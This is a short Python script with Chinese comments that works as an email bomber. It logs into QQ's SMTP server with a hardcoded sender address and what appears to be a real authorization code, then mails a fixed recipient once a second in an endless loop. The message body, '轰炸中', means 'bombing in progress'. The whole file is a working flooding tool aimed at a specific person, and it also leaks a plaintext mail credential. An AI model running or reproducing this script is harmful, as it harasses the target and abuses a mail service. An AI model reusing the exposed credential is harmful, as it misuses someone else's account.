
#发邮件的库
import sys
import smtplib
import time
ecoding="utf-8"
#邮件文本
from email.mime.text import MIMEText
#SMTP服务器
SMTPServer = "smtp.qq.com"
#发邮件的地址
sender = "2115655391@qq.com"
#发送者邮箱的密码
passwd = "obsdfcqvqznbcecg"
#设置发送的内容
message = "轰炸中"
#转换成邮件文本
msg = MIMEText(message)
#标题
msg["Subject"] = "snake"
#发送者
msg["From"] = sender
#创建SMTP服务器
mailServer = smtplib.SMTP(SMTPServer, 25)
#登陆邮箱
mailServer.login(sender, passwd)
#发送邮件
while True :
    mailServer.sendmail(sender, ["1929889858@qq.com"], msg.as_string())
    time.sleep(1)
#退出邮箱
mailServer.quit()













